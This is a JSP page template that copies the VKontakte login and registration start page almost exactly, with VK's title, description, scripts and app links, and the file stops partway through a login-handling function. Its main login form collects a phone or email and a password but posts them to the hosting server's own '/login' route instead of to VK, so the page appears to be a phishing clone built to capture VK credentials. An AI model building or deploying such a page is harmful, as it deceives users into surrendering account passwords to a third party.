<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jsp/jstl/fmt" %>
<%@taglib uri="http://www.springframework.org/tags" prefix="spring"%>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru"><head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="shortcut icon" href="/resources/img/fav_logo.ico?5">

    <link rel="apple-touch-icon" href="/resources/img/safari_60.png">
    <link rel="apple-touch-icon" sizes="76x76" href="/resources/img/safari_76.png">
    <link rel="apple-touch-icon" sizes="120x120" href="/resources/img/safari_120.png">
    <link rel="apple-touch-icon" sizes="152x152" href="/resources/img/safari_152.png">

    <meta http-equiv="content-type" content="text/html; charset=windows-1251">
    <meta name="description" content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте.">


    <title>Добро пожаловать | ВКонтакте</title>

    <link rel="stylesheet" type="text/css" href="/resources/css/fonts_cnt.css">
    <link rel="stylesheet" type="text/css" href="/resources/css/common.css">

    <script id="facebook-jssdk" async="" src="/connect.facebook.net/en_US/all.js"></script><script type="text/javascript" async="" src="https://top-fwz1.mail.ru/js/code.js"></script><script type="text/javascript">
    var vk = {
        ads_rotate_interval: 120000,
        al: parseInt('3') || 4,
        id: 0,
        intnat: '' ? true : false,
        host: 'vk.com',
        lang: 0,
        rtl: parseInt('') || 0,
        version: 802817303295,
        stDomains: 0,
        zero: false,
        contlen: 12261,
        loginscheme: 'https',
        ip_h: '5d5e1e970827998699',
        vc_h: '00fbbd0adca9dd45c733e3c44d2dab46',
        navPrefix: '/',
        dt: parseInt('0') || 0,
        fs: parseInt('13') || 13,
        ts: 1476450472,
        tz: 10800,
        pd: 0,
        pads: 1,
        css_dir: '',
        vcost: 7,
        time: [2016, 10, 14, 16, 7, 52],
        sampleUser: -1, spentLastSendTS: new Date().getTime(),
        a11y: 0,

        pr_tpl: "<div class=\"pr %cls%\" id=\"%id%\"><div class=\"pr_bt\"><\/div><div class=\"pr_bt\"><\/div><div class=\"pr_bt\"><\/div><\/div>",

        audioParams: {"addHash":"","deleteHash":"","audioInlinePlayerTpl":"<div class=\"audio_inline_player _audio_inline_player no_select\">\n  <div class=\"audio_inline_player_right\">\n    <div class=\"audio_inline_player_volume\"><\/div>\n  <\/div>\n  <div class=\"audio_inline_player_left\">\n    <div class=\"audio_inline_player_progress\"><\/div>\n  <\/div>\n<\/div>"}
    };

    window.locDomain = vk.host.match(/[a-zA-Z]+\.[a-zA-Z]+\.?$/)[0];
    var _ua = navigator.userAgent.toLowerCase();
    /*if (/opera/i.test(_ua) || !/msie 6/i.test(_ua) || document.domain != locDomain) document.domain = locDomain;*/
    var ___htest = (location.toString().match(/#(.*)/) || {})[1] || '', ___to;
    if (vk.al != 1 && ___htest.length && ___htest.substr(0, 1) == vk.navPrefix) {
        if (vk.al != 3 || vk.navPrefix != '!') {
            ___to = ___htest.replace(/^(\/|!)/, '');
            if (___to.match(/^([^\?]*\.php|login|mobile)([^a-z0-9\.]|$)/)) ___to = '';
            location.replace(location.protocol + '//' + location.host + '/' + ___to);
        }
    }

    var StaticFiles = {
        'common.js' : {v: 1136},
        'fonts_cnt.css' : {v: 2696088870},
        'common.css': {v: 3843198751}
        ,'lang0_0.js':{v:6749},'index.css':{v:1709741551},'index.js':{v:752775373},'login.css':{v:1643917202},'ui_controls.css':{v:673147432},'ui_controls.js':{v:3165552795},'ui_common.js':{v:2676309583},'ui_common.css':{v:582606628},'audioplayer.js':{v:833255081}
    }
    var abp;
</script>

    <link type="text/css" rel="stylesheet" href="/resources/css/index.css"><link type="text/css" rel="stylesheet" href="/resources/css/login.css"><link type="text/css" rel="stylesheet" href="/resources/css/ui_controls.css"><link type="text/css" rel="stylesheet" href="/resources/css/ui_commons.css"><script type="text/javascript" src="/resources/js/loader_nav802817303295_0.js"></script><script type="text/javascript" src="/resources/js/al/common.js"></script><script type="text/javascript" src="/resources/js/lang0_0.js"></script><script type="text/javascript" src="/resources/js/lib/px1.js"></script><script type="text/javascript" src="/resources/js/lib/px2.js"></script><link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.vk.com/"><link rel="alternate" href="android-app://com.vkontakte.android/vkontakte/m.vk.com/"><script type="text/javascript" src="/resources/js/al/index.js"></script><script type="text/javascript" src="/resources/js/lib/ui_controls.js"></script><script type="text/javascript" src="/resources/js/al/ui_common.js"></script><script type="text/javascript" src="/resources/js/al/audioplayer.js"></script>

    <script type="text/javascript" src="/resources/js/al/aes_light.js"></script><script type="text/javascript" src="/resources/js/al/tooltips.js"></script><link type="text/css" rel="stylesheet" href="/resources/css/tooltips.css"><script type="text/javascript" src="/resources/js/al/fbsign.js"></script><style type="text/css">.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:"lucida grande", tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}.fb_link img{border:none}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
.fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_reset .fb_dialog_legacy{overflow:visible}.fb_dialog_advanced{padding:10px;-moz-border-radius:8px;-webkit-border-radius:8px;border-radius:8px}.fb_dialog_content{background:#fff;color:#333}.fb_dialog_close_icon{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;_background-image:url(https://static.xx.fbcdn.net/rsrc.php/v3/yL/r/s816eWC-2sl.gif);cursor:pointer;display:block;height:15px;position:absolute;right:18px;top:17px;width:15px}.fb_dialog_mobile .fb_dialog_close_icon{top:5px;left:5px;right:auto}.fb_dialog_padding{background-color:transparent;position:absolute;width:1px;z-index:-1}.fb_dialog_close_icon:hover{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent;_background-image:url(https://static.xx.fbcdn.net/rsrc.php/v3/yL/r/s816eWC-2sl.gif)}.fb_dialog_close_icon:active{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent;_background-image:url(https://static.xx.fbcdn.net/rsrc.php/v3/yL/r/s816eWC-2sl.gif)}.fb_dialog_loader{background-color:#f6f7f9;border:1px solid #606060;font-size:24px;padding:20px}.fb_dialog_top_left,.fb_dialog_top_right,.fb_dialog_bottom_left,.fb_dialog_bottom_right{height:10px;width:10px;overflow:hidden;position:absolute}.fb_dialog_top_left{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/8YeTNIlTZjm.png) no-repeat 0 0;left:-10px;top:-10px}.fb_dialog_top_right{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/8YeTNIlTZjm.png) no-repeat 0 -10px;right:-10px;top:-10px}.fb_dialog_bottom_left{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/8YeTNIlTZjm.png) no-repeat 0 -20px;bottom:-10px;left:-10px}.fb_dialog_bottom_right{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/8YeTNIlTZjm.png) no-repeat 0 -30px;right:-10px;bottom:-10px}.fb_dialog_vert_left,.fb_dialog_vert_right,.fb_dialog_horiz_top,.fb_dialog_horiz_bottom{position:absolute;background:#525252;filter:alpha(opacity=70);opacity:.7}.fb_dialog_vert_left,.fb_dialog_vert_right{width:10px;height:100%}.fb_dialog_vert_left{margin-left:-10px}.fb_dialog_vert_right{right:0;margin-right:-10px}.fb_dialog_horiz_top,.fb_dialog_horiz_bottom{width:100%;height:10px}.fb_dialog_horiz_top{margin-top:-10px}.fb_dialog_horiz_bottom{bottom:0;margin-bottom:-10px}.fb_dialog_iframe{line-height:0}.fb_dialog_content .dialog_title{background:#6d84b4;border:1px solid #365899;color:#fff;font-size:14px;font-weight:bold;margin:0}.fb_dialog_content .dialog_title>span{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;float:left;padding:5px 0 7px 26px}body.fb_hidden{-webkit-transform:none;height:100%;margin:0;overflow:visible;position:absolute;top:-10000px;left:0;width:100%}.fb_dialog.fb_dialog_mobile.loading{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;min-height:100%;min-width:100%;overflow:hidden;position:absolute;top:0;z-index:10001}.fb_dialog.fb_dialog_mobile.loading.centered{width:auto;height:auto;min-height:initial;min-width:initial;background:none}.fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner{width:100%}.fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content{background:none}.loading.centered #fb_dialog_loader_close{color:#fff;display:block;padding-top:20px;clear:both;font-size:18px}#fb-root #fb_dialog_ipad_overlay{background:rgba(0, 0, 0, .45);position:absolute;bottom:0;left:0;right:0;top:0;width:100%;min-height:100%;z-index:10000}#fb-root #fb_dialog_ipad_overlay.hidden{display:none}.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}.fb_dialog_content .dialog_header{-webkit-box-shadow:white 0 1px 1px -1px inset;background:-webkit-gradient(linear, 0% 0%, 0% 100%, from(#738ABA), to(#2C4987));border-bottom:1px solid;border-color:#1d4088;color:#fff;font:14px Helvetica, sans-serif;font-weight:bold;text-overflow:ellipsis;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0;vertical-align:middle;white-space:nowrap}.fb_dialog_content .dialog_header table{-webkit-font-smoothing:subpixel-antialiased;height:43px;width:100%}.fb_dialog_content .dialog_header td.header_left{font-size:12px;padding-left:5px;vertical-align:middle;width:60px}.fb_dialog_content .dialog_header td.header_right{font-size:12px;padding-right:5px;vertical-align:middle;width:60px}.fb_dialog_content .touchable_button{background:-webkit-gradient(linear, 0% 0%, 0% 100%, from(#4966A6), color-stop(.5, #355492), to(#2A4887));border:1px solid #29487d;-webkit-background-clip:padding-box;-webkit-border-radius:3px;-webkit-box-shadow:rgba(0, 0, 0, .117188) 0 1px 1px inset, rgba(255, 255, 255, .167969) 0 1px 0;display:inline-block;margin-top:3px;max-width:85px;line-height:18px;padding:4px 12px;position:relative}.fb_dialog_content .dialog_header .touchable_button input{border:none;background:none;color:#fff;font:12px Helvetica, sans-serif;font-weight:bold;margin:2px -12px;padding:2px 6px 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16px;font-weight:bold;line-height:18px;text-align:center;vertical-align:middle}.fb_dialog_content .dialog_content{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;border:1px solid #555;border-bottom:0;border-top:0;height:150px}.fb_dialog_content .dialog_footer{background:#f6f7f9;border:1px solid #555;border-top-color:#ccc;height:40px}#fb_dialog_loader_close{float:left}.fb_dialog.fb_dialog_mobile .fb_dialog_close_button{text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog.fb_dialog_mobile .fb_dialog_close_icon{visibility:hidden}#fb_dialog_loader_spinner{animation:rotateSpinner 1.2s linear infinite;background-color:transparent;background-image:url(https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);background-repeat:no-repeat;background-position:50% 50%;height:24px;width:24px}@keyframes rotateSpinner{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_hide_iframes iframe{position:relative;left:-10000px}.fb_iframe_widget_loader{position:relative;display:inline-block}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}.fb_iframe_widget_loader iframe{min-height:32px;z-index:2;zoom:1}.fb_iframe_widget_loader .FB_Loader{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat;height:32px;width:32px;margin-left:-16px;position:absolute;left:50%;z-index:4}</style></head>

<body onresize="onBodyResize()" class="index_page" data-useragent="chrome">
<div id="system_msg" class="fixed"></div>
<div id="utils"><div id="fonts_cnt_css"></div><div id="common_css"></div><div id="index_css"></div><div id="login_css"></div><div id="ui_controls_css"></div><div id="ui_common_css"></div><iframe></iframe><div id="tooltips_css"></div></div>

<div id="layer_bg" class="fixed" style="height: 208px;"></div><div id="layer_wrap" class="scroll_fix_wrap fixed layer_wrap" style="width: 1366px; height: 208px;"><div id="layer" style="width: 1348px;"></div></div>
<div id="box_layer_bg" class="fixed" style="height: 208px;"></div><div id="box_layer_wrap" class="scroll_fix_wrap fixed" style="width: 1366px; height: 208px;"><div id="box_layer" style="width: 1348px;"><div id="box_loader"><div class="pr pr_baw pr_medium" id="box_loader_pr"><div class="pr_bt"></div><div class="pr_bt"></div><div class="pr_bt"></div></div><div class="back"></div></div></div></div>

<div id="stl_left" style="width: 178px;"><div id="stl_bg"><nobr id="stl_text">Наверх</nobr></div></div><div id="stl_side" style="left: 179px; width: 10px; top: 42px; height: 166px;"></div>

<script type="text/javascript">domStarted();</script>

<div class="scroll_fix_wrap _page_wrap" id="page_wrap"><div><div class="scroll_fix" style="width: 1348px;">


    <div id="page_header_cont" class="page_header_cont">
        <div class="back"></div>
        <div id="page_header_wrap" class="page_header_wrap" style="width: 1348px;">
            <a class="top_back_link" href="" id="top_back_link" onclick="if (nav.go(this, event, {back: true}) === false) { showBackLink(); return false; }" onmousedown="tnActive(this)" style="max-width: 1313px;"></a>
            <div id="page_header" class="p_head p_head_l0" style="width: 960px">
                <div class="content">
                    <div id="top_nav" class="head_nav">
                        <div class="head_nav_item fl_l"><a class="top_home_link fl_l " href="/" aria-label="На главную" accesskey="1"><div class="top_home_logo"></div></a></div>
                        <div class="head_nav_item fl_l"><div id="ts_wrap" class="ts_wrap" onmouseover="TopSearch.initFriendsList();">
                            <input name="disable-autofill" style="display: none;">
                            <div class="input_back_wrap no_select"><div class="input_back" style="margin: 7px 0px 7px 8px; padding: 6px 6px 6px 19px;"><div class="input_back_content" style="width: 210px;">Поиск</div></div></div><input type="text" onmousedown="event.cancelBubble = true;" ontouchstart="event.cancelBubble = true;" class="text ts_input" id="ts_input" autocomplete="off" name="disable-autofill" aria-label="Поиск">
                        </div></div>
                        <div class="head_nav_item fl_l head_nav_btns"><span id="top_audio_layer_place"></span></div>
                        <div class="head_nav_item fl_r"><a class="top_nav_link" href="" id="top_switch_lang" style="" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: '3f55f01065a18344b6' }); return false;" onmousedown="tnActive(this)">
                            Switch to English
                        </a><a class="top_nav_link" href="/join" id="top_reg_link" style="display: none" onclick="return !showBox('join.php', {act: 'box', from: nav.strLoc}, {}, event)" onmousedown="tnActive(this)">
                            регистрация
                        </a></div>
                        <div class="head_nav_item_player"></div>
                    </div>
                    <div id="ts_cont_wrap" class="ts_cont_wrap" ontouchstart="event.cancelBubble = true;" onmousedown="event.cancelBubble = true;"></div>
                </div>
            </div>
        </div>
    </div>

    <div id="page_layout" style="width: 960px;">
        <div id="side_bar" class="fl_l " style="display: none">
            <div id="side_bar_inner" class="side_bar_inner" style="position: relative; margin-top: 42px;">
                <div id="quick_login" class="quick_login">
                    <div><iframe class="upload_frame" id="quick_login_frame" name="quick_login_frame"></iframe></div><form method="POST" name="login" id="quick_login_form" action="https://login.vk.com/?act=login" target="quick_login_frame">
                    <input type="hidden" name="act" value="login">
                    <input type="hidden" name="role" value="al_frame">
                    <input type="hidden" name="expire" id="quick_expire_input" value="">
                    <input type="hidden" name="captcha_sid" id="quick_captcha_sid" value="">
                    <input type="hidden" name="captcha_key" id="quick_captcha_key" value="">
                    <input type="hidden" name="_origin" value="https://vk.com">
                    <input type="hidden" name="ip_h" value="5d5e1e970827998699">
                    <input type="hidden" name="lg_h" value="7ffd285b35f2a069f9">
                    <div class="label">Телефон или email</div>
                    <div class="labeled"><input type="text" name="email" class="dark" id="quick_email"></div>
                    <div class="label">Пароль</div>
                    <div class="labeled"><input type="password" name="pass" class="dark" id="quick_pass" onkeyup="toggle('quick_expire', !!this.value);toggle('quick_forgot', !this.value)"></div>
                    <input type="submit" class="submit">
                </form>
                    <button class="quick_login_button flat_button button_wide" id="quick_login_button">Войти</button>
                    <button class="quick_reg_button flat_button button_wide" id="quick_reg_button" style="display: none" onclick="top.showBox('join.php', {act: 'box', from: nav.strLoc})">Регистрация</button>
                    <div class="clear forgot"><div class="checkbox" id="quick_expire" onclick="checkbox(this);ge('quick_expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div><a id="quick_forgot" class="quick_forgot" href="/restore" target="_top">Забыли пароль?</a></div>
                </div>
            </div>
        </div>

        <div id="page_body" class="fl_r " style="width: 960px;">
            <div id="header_wrap2">
                <div id="header_wrap1">
                    <div id="header" style="display: none">
                        <h1 id="title"></h1>
                    </div>
                </div>
            </div>
            <div id="wrap_between"></div>
            <div id="wrap3"><div id="wrap2">
                <div id="wrap1">
                    <div id="content" class=""><div id="index_rcolumn" class="index_rcolumn">
                        <div id="index_login" class="page_block index_login">
                            <form method="post" name="login" id="login_form" action="/login">
                                <input type="text" class="big_text" name="login" id="index_email" value="" placeholder="Телефон или email">
                                <input type="password" class="big_text" name="password" id="index_pass" value="" placeholder="Пароль" onkeyup="toggle('index_expire', !!this.value);toggle('index_forgot', !this.value)">
                                <button id="index_login_button" class="index_login_button flat_button button_big_text">Войти</button>
                                <div class="forgot">
                                    <div class="checkbox" id="index_expire" onclick="checkbox(this);ge('index_expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div>
                                    <a id="index_forgot" class="index_forgot" href="/restore" target="_top">Забыли пароль?</a>
                                </div>
                            </form>
                        </div>
                        <div id="ij_form" class="page_block ij_form">
                            <h2 class="ij_header">Впервые ВКонтакте?</h2>
                            <div class="ij_subheader">Моментальная регистрация</div>
                            <div id="ij_msg"></div>
                            <input type="text" class="big_text" id="ij_first_name" value="" placeholder="Ваше имя">
                            <input type="text" class="big_text" id="ij_last_name" value="" placeholder="Ваша фамилия">
                            <div class="ij_label">Дата рождения<span class="hint_icon" data-title="<b>Заполненная дата рождения</b> позволит друзьям легче найти Вас, а также подбирать для Вас интересные материалы.<br>Вы сможете всегда настроить видимость Вашей даты рождения в редактировании профиля." onmouseover="showHint(this);"></span></div>
                            <div id="ij_birthdate_row" class="ij_birthdate_row clear_fix">
                                <div class="ij_bday"><div id="container1" class="selector_container dropdown_container big big_text" style="width: 75px;"><table cellspacing="0" cellpadding="0" class="selector_table">    <tbody><tr>      <td class="selector">        <div class="placeholder_wrap1" style="display: none;">          <div class="placeholder_wrap2">            <div class="placeholder_content" style="color: rgb(124, 127, 130);"></div>            <div class="placeholder_cover"></div>          </div>        </div>        <span class="selected_items"></span>        <input type="text" class="selector_input selected" readonly="true" style="color: rgb(124, 127, 130); width: 35px;">        <input type="hidden" name="selectedItems" id="selectedItems" value="0" class="resultField">        <input type="hidden" name="selectedItems_custom" id="selectedItems_custom" value="" class="customField">      </td><td id="dropdown1" class="selector_dropdown" style="width: 26px;">&nbsp;</td>    </tr>  </tbody></table>  <div class="results_container">    <div class="result_list dividing_line" style="display: none; opacity: 1; width: 75px;"><ul></ul></div>  </div></div></div>
                                <div class="ij_bmonth"><div id="container2" class="selector_container dropdown_container big big_text" style="width: 100px;"><table cellspacing="0" cellpadding="0" class="selector_table">    <tbody><tr>      <td class="selector">        <div class="placeholder_wrap1" style="display: none;">          <div class="placeholder_wrap2">            <div class="placeholder_content" style="color: rgb(124, 127, 130);"></div>            <div class="placeholder_cover"></div>          </div>        </div>        <span class="selected_items"></span>        <input type="text" class="selector_input selected" readonly="true" style="color: rgb(124, 127, 130); width: 60px;">        <input type="hidden" name="selectedItems" id="selectedItems" value="0" class="resultField">        <input type="hidden" name="selectedItems_custom" id="selectedItems_custom" value="" class="customField">      </td><td id="dropdown2" class="selector_dropdown" style="width: 26px;">&nbsp;</td>    </tr>  </tbody></table>  <div class="results_container">    <div class="result_list dividing_line" style="display: none; opacity: 1; width: 100px;"><ul></ul></div>  </div></div></div>
                                <div class="ij_byear"><div id="container3" class="selector_container dropdown_container big big_text" style="width: 75px;"><table cellspacing="0" cellpadding="0" class="selector_table">    <tbody><tr>      <td class="selector">        <div class="placeholder_wrap1" style="display: none;">          <div class="placeholder_wrap2">            <div class="placeholder_content" style="color: rgb(124, 127, 130);"></div>            <div class="placeholder_cover"></div>          </div>        </div>        <span class="selected_items"></span>        <input type="text" class="selector_input selected" readonly="true" style="color: rgb(124, 127, 130); width: 35px;">        <input type="hidden" name="selectedItems" id="selectedItems" value="0" class="resultField">        <input type="hidden" name="selectedItems_custom" id="selectedItems_custom" value="" class="customField">      </td><td id="dropdown3" class="selector_dropdown" style="width: 26px;">&nbsp;</td>    </tr>  </tbody></table>  <div class="results_container">    <div class="result_list dividing_line" style="display: none; opacity: 1; width: 75px;"><ul></ul></div>  </div></div></div>
                            </div>
                            <div id="ij_sex_row" class="clear_fix unshown">
                                <div class="ij_label">Ваш пол</div>
                                <div class="radiobtn" onclick="radiobtn(this, 1, 'ij_sex');">Женский</div>
                                <div class="radiobtn" onclick="radiobtn(this, 2, 'ij_sex');">Мужской</div>
                            </div>
                            <button class="flat_button button_wide button_big_text ij_button" id="ij_submit" onclick="Index.submitJoinStart()">Зарегистрироваться</button>
                            <div id="index_fbsign" class="index_fbsign" style="opacity: 1; display: block;">
                                <a id="index_fb" class="index_fb_lnk" href="" onclick="return Index.fbJoin();"><div class="index_fb_icon"></div>Войти через Facebook</a>
                            </div>
                        </div>
                    </div>
                        <div class="login_mobile_promo_wrap clear_fix">
                            <div class="login_mobile_apps">
                                <div class="login_mobile_header">ВКонтакте для мобильных устройств</div>
                                <div class="login_mobile_info">Установите официальное мобильное приложение ВКонтакте и оставайтесь в&nbsp;курсе новостей Ваших друзей, где бы Вы ни находились.</div>

                                <div class="login_app_devices">

                                    <a href="https://play.google.com/store/apps/details?id=com.vkontakte.android" target="_blank" class="login_app_device login_app_device_android">
                                        <div class="login_app_device_screen_wrap">
                                            <div class="login_app_device_screen login_app_device_ru"></div>
                                        </div>

                                        <div class="login_app_download_wrap">
                                            <button class="flat_button secondary button_light">
                                                <span class="login_app_download_icon"></span>
                                                VK для Android
                                            </button>
                                        </div>
                                    </a>

                                    <a href="http://windowsphone.com/s?appid=edd920e2-b671-41b5-a9db-b89caccfa69c" target="_blank" class="login_app_device login_app_device_wp">
                                        <div class="login_app_device_screen_wrap">
                                            <div class="login_app_device_screen login_app_device_ru"></div>
                                        </div>

                                        <div class="login_app_download_wrap">
                                            <button class="flat_button secondary button_light">
                                                <span class="login_app_download_icon"></span>
                                                VK для WP
                                            </button>
                                        </div>
                                    </a>

                                    <a href="https://itunes.apple.com/ru/app/id564177498" target="_blank" class="login_app_device login_app_device_ios">
                                        <div class="login_app_device_screen_wrap">
                                            <div class="login_app_device_screen login_app_device_ru"></div>
                                        </div>

                                        <div class="login_app_download_wrap">
                                            <button class="flat_button secondary button_light">
                                                <span class="login_app_download_icon"></span>
                                                VK для iPhone
                                            </button>
                                        </div>
                                    </a>

                                </div>
                            </div>
                            <a onclick="curBox().hide()" id="login_mobile_close" class="login_mobile_close"></a>

                            <div class="login_about_mobile">
                                Для доступа к быстрой мобильной версии сайта ВКонтакте достаточно ввести в Вашем телефоне короткий адрес: <a target="_blank" href="https://m.vk.com">m.vk.com</a>
                            </div>
                        </div>
                        <div id="index_footer_wrap" class="footer_wrap index_footer_wrap">
                            <div class="footer_nav" id="bottom_nav">
                                <div class="footer_copy fl_l"><a href="/about">ВКонтакте</a> © 2016</div>
                                <div class="footer_lang fl_r">Язык:<a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: '3f55f01065a18344b6'})">English</a><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 0, hash: '3f55f01065a18344b6'})">Русский</a><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 1, hash: '3f55f01065a18344b6'})">Українська</a><a class="footer_lang_link" onclick="if (vk.al) { showBox('lang.php', {act: 'lang_dialog', all: 1}, {params: {dark: true, bodyStyle: 'padding: 0px'}, noreload: true}); } else { changeLang(1); } return false;">все языки »</a></div>
                                <div class="footer_links">
                                    <a class="bnav_a" href="/about">о компании</a>
                                    <a class="bnav_a" href="/support?act=home" style="display: none;">помощь</a>
                                    <a class="bnav_a" href="/terms">правила</a>
                                    <a class="bnav_a" href="/ads" style="">реклама</a>

                                    <a class="bnav_a" href="/dev">разработчикам</a>
                                    <a class="bnav_a" href="/jobs" style="display: none;">вакансии</a>
                                </div>
                            </div>

                            <div class="footer_bench clear">

                            </div>
                        </div></div>
                </div>
            </div></div>
        </div>

        <div id="footer_wrap" class="footer_wrap fl_r" style="width: 960px;"><div class="footer_nav" id="bottom_nav">
            <div class="footer_copy fl_l"><a href="/about">ВКонтакте</a> © 2016</div>
            <div class="footer_lang fl_r">Язык:<a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: '3f55f01065a18344b6'})">English</a><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 0, hash: '3f55f01065a18344b6'})">Русский</a><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 1, hash: '3f55f01065a18344b6'})">Українська</a><a class="footer_lang_link" onclick="if (vk.al) { showBox('lang.php', {act: 'lang_dialog', all: 1}, {params: {dark: true, bodyStyle: 'padding: 0px'}, noreload: true}); } else { changeLang(1); } return false;">все языки »</a></div>
            <div class="footer_links">
                <a class="bnav_a" href="/about">о компании</a>
                <a class="bnav_a" href="/support?act=home" style="display: none;">помощь</a>
                <a class="bnav_a" href="/terms">правила</a>
                <a class="bnav_a" href="/ads" style="">реклама</a>

                <a class="bnav_a" href="/dev">разработчикам</a>
                <a class="bnav_a" href="/jobs" style="display: none;">вакансии</a>
            </div>
        </div>

            <div class="footer_bench clear">

            </div></div>
        <div class="clear"></div>
    </div>
</div></div><noscript>&lt;div style="position:absolute;left:-10000px;"&gt;
    &lt;img src="//top-fwz1.mail.ru/counter?id=2579437;js=na" style="border:0;" height="1" width="1" /&gt;
    &lt;/div&gt;</noscript></div>
<div class="progress" id="global_prg"></div>

<script type="text/javascript">
    if (parent && parent != window && (browser.msie || browser.opera || browser.mozilla || browser.chrome || browser.safari || browser.iphone)) {
        document.getElementsByTagName('body')[0].innerHTML = '';
    } else {
        domReady();
        updateMoney(0);
        if (browser.iphone || browser.ipad || browser.ipod) {
            setStyle(bodyNode, {webkitTextSizeAdjust: 'none'});
        }var qf = ge('quick_login_form'), ql = ge('quick_login'), qe = ge('quick_email'), qp = ge('quick_pass');
        var qlb = ge('quick_login_button'), prgBtn = qlb;

        var qinit = function() {
            setTimeout(function() {
                ql.insertBefore(ce('div', {innerHTML: '<iframe class="upload_frame" id="quick_login_frame" name="quick_login_frame"></iframe>'}), qf);
                qf.target = 'quick_login_frame';
            }, 1);
        }

        if (window.top && window.top != window) {
            window.onload = qinit;
        } else {
            setTimeout(qinit, 0);
        }

        qf.onsubmit = function() {
            if (!ge('quick_login_frame')) return false;
            if (!trim(qe.value)) {
                notaBene(qe);
                return false;
            } else if (!trim(qp.value)) {
                notaBene(qp);
                return false;
            }
            lockButton(window.__qfBtn = prgBtn);
            prgBtn = qlb;
            clearTimeout(__qlTimer);
            __qlTimer = setTimeout(loginSubmitError, 30000);
            domFC(domPS(qf)).onload = function() {
                clearTimeout(__qlTimer);
                __qlTimer = setTimeout(loginSubmitError, 2500);
            }
            return true;
        }

        window.loginSubmitError = function() {
            showFastBox('Предупреждениe', 'Не удается пройти авторизацию по защищенному соединению. Чаще всего это происходит, когда на Вашем компьютере установлены неправильные текущие дата и время. Пожалуйста, проверьте настройки даты и времени в системе и перезапустите браузер.');
        }
        window.focusLoginInput = function() {
            scrollToTop(0);
            notaBene('quick_email');
        }
        window.changeQuickRegButton = function(noShow) {
            if (noShow) {
                hide('top_reg_link', 'quick_reg_button');
            } else {
                show('top_reg_link', 'quick_reg_button');
            }
            toggle('top_switch_lang', noShow && window.langConfig && window.langConfig.id != 3);
        }
        window.submitQuickLoginForm = function(email, pass, opts) {
            setQuickLoginData(email, pass, opts);
            if (opts && opts.prg) prgBtn = opts.prg;
            if (qf.onsubmit()) qf.submit();
        }
        window.setQuickLoginData = function(email, pass, opts) {
            if (email !== undefined) ge('quick_email').value = email;
            if (pass !== undefined) ge('quick_pass').value = pass;
            var params = opts && opts.params || {};
            each (params, function(i, v) {
                var el = ge('quick_' + i) || ge('quick_login_' + i);;
                if (el) {
                    val(el, params[i]);
                } else {
